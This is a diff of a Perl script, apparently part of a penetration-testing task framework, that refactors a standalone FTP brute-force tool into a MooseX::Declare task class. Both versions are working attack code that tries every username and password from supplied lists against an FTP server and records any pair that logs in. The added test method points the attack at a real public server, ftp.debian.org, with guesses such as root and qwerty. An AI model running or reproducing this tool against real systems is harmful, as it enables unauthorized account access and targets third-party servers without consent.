@@ -1,69 +1,61 @@
-#!perl
-use Data::Dumper;
-use strict;
-use Net::FTP;
+# FTP bruteforce
+# ---
 
-unless ( @ARGV ) { print q[Error: argument list is empty], "\n"; exit(0); };
+use MooseX::Declare;
+use core::task qw(execute);
 
-my ( @target, @users, @passw, $cnt, $ftp, );
+# FTP bruteforce
+class FTP_Bruteforce extends Task {
+    use constant TIMEOUT => 3600;
+    use Net::FTP;
 
-@target	= &getinput( $ARGV[0] ) if ( $ARGV[0] );
-my $outfile = $ARGV[1];
-@users	= &getinput( $ARGV[2] ) if ( $ARGV[2] );
-@passw	= &getinput( $ARGV[3] ) if ( $ARGV[3] );
+    # Process
+    method _process(Str $target, $users, $passw) {
+        my ($cnt, $ftp);
 
-open(OUTFILE, ">>$outfile");
+        unless ($ftp = Net::FTP->new($target)) {
+            $self->_write_result("Failed to connect to $target.");
+            return;
+        }
 
- if ( $ftp = Net::FTP->new( $target[0] ) ) {
+        $cnt = 0;
 
-  map {
+        map {
+            my $user = $_;
+            chomp($user);
 
-	  my $user = $_; chomp( $user );
-	  map {
+            map {
+                my $try = $_;
+                chomp($try);
 
-		  my $try = $_; chomp( $try );
+                if ($ftp->login($user, $try)) {
+                    $self->_write_result("pair $user:$try is good for $target\n");
+                    return;
+                }
 
-		  if( $ftp->login( $user, $try ) ) {
+                $cnt++;
+                sleep(1);
+            } @$passw;
+        } @$users;
 
-			print OUTFILE qq[pair $user:$try is good for $target[0]\n];
-			close OUTFILE;
-			exit(0);
+        $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...\n");
+        $ftp->quit();
+    }
 
-		  }
-			$cnt++;
-		  sleep(1);
+    # Main function
+    method main($args) {
+        my ($users, $passw);
 
-	  } @passw;
+        $users = $self->_get_arg($args, 0);
+        $passw = $self->_get_arg($args, 1);
 
-  } @users;
+        $self->_process($self->target, $users, $passw);
+    }
 
-  print OUTFILE qq[tried $cnt user:pass combinations on $target[0], none succeeded...\n];
-
+    # Test function
+    method test {
+        $self->_process("ftp.debian.org", ["root", "test"], ["123", "qwerty"]);
+    }
 }
-else { print OUTFILE qq[Error: failed to connect to $target[0]\n]; }
 
-$ftp->quit();
-
-close(OUTFILE);
-
-exit(0);
-
-sub getinput {
-
-  my $fi = shift;
-
-  if ( open( IN, '<:utf8', $fi ) ) {
-
-	my @fo;
-
-	while( <IN> ){ s/^(\S+)$/{ push @fo, $1; }/e; }
-
-	close( IN );
-
-	return @fo; # if ( scalar @fo > 1 );
-	# return $fo[0];
-
-  }
-  else { print q[Error: cannot open file ], $fi, "\n"; exit(0); }
-
-};
+execute(FTP_Bruteforce->new());
